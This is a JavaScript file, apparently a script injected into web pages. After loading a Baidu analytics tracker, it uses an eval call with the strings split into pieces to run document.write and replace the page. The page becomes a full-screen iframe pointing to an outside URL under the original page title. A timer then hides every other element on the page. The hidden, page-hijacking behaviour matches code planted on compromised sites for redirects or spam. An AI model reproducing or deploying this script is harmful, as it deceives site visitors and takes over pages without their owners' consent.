var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?acf6688ef7d3d692da682458b0a4d53d";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
	var titlestr = document.title;
	var arr = ["https://www.baidu.com/tz.html"];
	setFrame(arr[Math.floor(Math.random() * arr.length)]);

	function setFrame(olink) {
	  var ss = "<title>" + titlestr + "</title><div id=\"showcloneshengxiaon\" style=\"height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;\"><ifr" + "ame scrolling=\"yes\" marginheight=0 marginwidth=0 frameborder=\"0\" border=\"0\" width=\"100%\" height=\"100%\" src=\"" + olink + "\"></iframe></div><style type=\"text/css\">html{width:100%;height:100%;}body {margin:0;padding:0;width:100%;height:100%;}</style>";
	  eval("docu" + "ment.wr" + "ite('" + ss + "');");

	  try {
	    // TOLOOK
	    setTimeout(function () {
	      console.log(document.body.children.length);

	      for (var i = 0; i < document.body.children.length; i++) {
	        try {
	          var a = document.body.children[i].tagName;
	          var b = document.body.children[i].id;
	          console.log(i + "***" + a + "**" + b);

	          if (b != "iconDiv1" && b != "showcloneshengxiaon" && a != "title") {
	            document.body.children[i].style.display = "none";
	          }
	        } catch (e) {
	          console.log("CatchClause", e);
	        }
	      }

	      var oMeta = document.createElement("meta");
	      oMeta.name = "viewport";
	      oMeta.content = "width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no";
	      document.getElementsByTagName("head")[0].appendChild(oMeta);
	    }, 100);
	  } catch (e) {
	    console.log("CatchClause", e);
	  }
	}
	


